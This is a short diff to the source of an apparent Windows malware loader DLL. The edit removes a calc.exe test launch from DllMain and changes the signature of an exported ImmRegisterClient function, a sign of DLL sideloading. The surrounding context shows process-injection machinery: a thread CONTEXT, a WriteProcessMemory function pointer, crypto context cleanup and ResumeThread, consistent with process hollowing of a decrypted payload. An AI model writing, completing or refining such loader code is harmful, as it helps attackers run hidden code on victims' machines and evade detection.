@@ -17,7 +17,6 @@
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
     switch (ul_reason_for_call) {
     case DLL_PROCESS_ATTACH:
-        WinExec("calc.exe",0);
     case DLL_THREAD_ATTACH:
     case DLL_THREAD_DETACH:
     case DLL_PROCESS_DETACH:
@@ -42,7 +41,7 @@ CryptReleaseContext(hProv, 0);
 
 }
 
-extern "C" __declspec(dllexport) void ImmRegisterClient()
+extern "C" __declspec(dllexport) long ImmRegisterClient()
 {
     
     CONTEXT da = {0};
@@ -86,5 +85,5 @@ BOOL (*pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*) =
     ResumeThread(pei.hThread); 
 
 
-    return 0;
+    return TRUE;
 }
